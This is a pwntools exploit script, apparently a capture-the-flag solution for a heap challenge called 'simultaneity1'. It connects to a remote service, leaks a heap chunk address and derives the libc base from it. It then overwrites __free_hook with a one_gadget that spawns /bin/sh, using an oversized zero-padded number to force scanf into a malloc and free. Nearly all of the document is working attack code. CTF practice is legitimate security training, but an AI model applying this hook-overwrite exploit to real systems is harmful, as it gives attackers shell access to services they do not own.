from pwn import *

libc = ELF("./libc.so.6")

# gdbscript to mess with if you wanna.
script = '''
b *main+84
b *main+160
    command
        b *__libc_scratch_buffer_grow_preserve+27
        b *malloc
        b *char_buffer_add
        b *free
        b *_IO_vfscanf+788
        b *_IO_vfscanf+963
    end
b *main+211
continue
'''

# Top+1 ensures that we get a heap alligned with libc (mmapped)
chunk_sz = 0x209a1+1
# How far is libc from our leaked chunk address?
libc_from_chunk = 0x20ff0

# Notes from the past: Our input has to contain only digits if we want it to trigger a malloc, then a free(). 
# Inputs that contain letters wont work because the scanf in the program expects an unsigned int. It also has to be pretty big 
# (dont know how big, exactly, but 2000 leading 0's seems to be enough to trigger a free() on the buffer, and thus jump into our 
# overwritten __free_hook).

def main():
    p = remote("mc.ax", 31547)
    #p = process("./simultaneity1")
    #gdb.attach(p, script)

    p.sendlineafter("how big?\n", str(chunk_sz))
    
    print(p.recvuntil("you are here: "))
    chunk_leak = p.recv(14).decode()
    chunk_leak = int(chunk_leak, 16)
    print(f"Got chunk: {hex(chunk_leak)}")

    libc.address = chunk_leak + libc_from_chunk
    print(f"Got libc base: {hex(libc.address)}")
    
    print(p.sendlineafter("how far?\n", str( int((libc.symbols["__free_hook"] - chunk_leak) / 8) )))
    
    #0x448a3 execve("/bin/sh", rsp+0x30, environ)
    #constraints:
    #[rsp+0x30] == NULL
    one_gdg = libc.address + 0x448a3

    # 1024/1023 == size of stack-scratch-buffer. Need to provide at least 1 more byte to use a heap allocation.
    p.sendlineafter("what?\n", "0"* (1024 - len(str(one_gdg))) + str(one_gdg))
    p.interactive()

if __name__ == "__main__":
    main()
